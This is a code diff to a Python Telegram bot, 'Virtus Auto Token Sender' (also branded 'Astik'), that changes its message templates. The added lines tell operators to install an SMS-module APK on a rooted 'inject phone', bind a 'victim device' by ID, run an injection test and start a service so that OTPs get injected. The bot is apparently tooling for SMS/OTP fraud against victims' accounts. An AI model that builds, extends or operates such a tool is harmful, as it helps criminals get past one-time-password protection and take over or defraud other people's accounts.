@@ -6,7 +6,7 @@ from telegram import InlineKeyboardButton, InlineKeyboardMarkup
 from app.database import Device, MonitorProfile
 
 STARTUP_TEST_SENDER = "BABY"
-STARTUP_TEST_MESSAGE = "ASTIK TEST OK — module alive"
+STARTUP_TEST_MESSAGE = "VIRTUS TEST OK — module alive"
 BRAND_NAME = "Virtus Auto Token Sender"
 ASTIK_BRAND_LINE = f"──✦ <b>{BRAND_NAME}</b> ✦──"
 
@@ -14,17 +14,17 @@ ASTIK_BRAND_LINE = f"──✦ <b>{BRAND_NAME}</b> ✦──"
 def format_apk_download_card(download_url: str) -> str:
     link = download_url.strip()
     return (
-        "📥 <b>Virtus SMS Module APK</b>\n\n"
+        "📥 <b>Astik Bot Module APK</b>\n\n"
         "👇 <b>iOS / iPhone:</b> neeche <b>Download APK</b> button dabao\n"
         "Phir Android phone par transfer karke install karo\n\n"
-        f'🔗 <a href="{link}">Tap here — Download Virtus APK</a>\n\n'
+        f'🔗 <a href="{link}">Tap here — Download APK</a>\n\n'
         "<pre>"
         "Android (rooted mynum phone):\n"
-        "1. APK install\n"
-        "2. APK me KEY|Firebase URL daalo (pipe format)\n"
-        "3. START SERVICE ON\n"
-        "4. TEST INJECTION\n"
-        "5. Bot /startmonitor"
+        "1. APK install (ASTIK SMS MODULE)\n"
+        "2. Bot: /key generate ya /key KEY-XXXX\n"
+        "3. Bot: /a device → /mynum apk-phone → /injecttest\n"
+        "4. APK me sirf wahi KEY daalo\n"
+        "5. START SERVICE ON → OTP inject hoga"
         "</pre>"
     )
 
@@ -737,7 +737,14 @@ def format_key_error_card() -> str:
 def format_key_generated_card(license_key: str) -> str:
     return (
         "✅ <b>KEY GENERATED</b>\n\n"
-        f"<pre>🔑 {license_key}</pre>"
+        f"<pre>🔑 {license_key}</pre>\n\n"
+        "<pre>"
+        "Next:\n"
+        "1. /a &lt;device_id&gt; — victim device\n"
+        "2. /mynum &lt;apk-phone&gt; — rooted inject phone\n"
+        "3. /injecttest — test SMS\n"
+        "APK: same KEY → START SERVICE ON"
+        "</pre>"
     )
 
 
